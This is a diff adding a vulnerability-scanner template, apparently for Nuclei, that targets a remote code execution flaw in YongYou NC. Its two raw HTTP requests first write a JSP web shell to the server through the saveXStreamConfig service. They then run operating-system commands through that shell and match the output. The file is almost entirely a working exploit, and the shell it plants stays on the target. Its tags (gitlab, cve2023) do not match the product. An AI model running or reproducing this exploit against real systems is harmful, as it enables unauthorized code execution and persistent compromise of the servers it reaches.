@@ -1,0 +1,58 @@
+id: YongYou_FileUpload_RCE
+
+info:
+  name: YongYou NC
+  author: pdteam
+  severity: critical
+  description: YongYou NC RCE
+  reference:
+    - None
+  tags: cve,cve2023,gitlab,rce,oast
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.90
+    cve-id: UNKNOWN
+    cwe-id: UNKNOWN
+
+requests:
+  - raw:
+      - |
+        POST /uapjs/jsinvoke?action=invoke HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/501.jsp"]}
+
+      - |
+        POST /501.jsp?error=bsh.Interpreter HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("{{url_encode(command)}}").getInputStream())
+
+    req-condition: true
+
+    payloads:
+      command:
+        - "id"
+        - "whoami /priv"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "uid"
+          - "Privilege"
+        condition: or
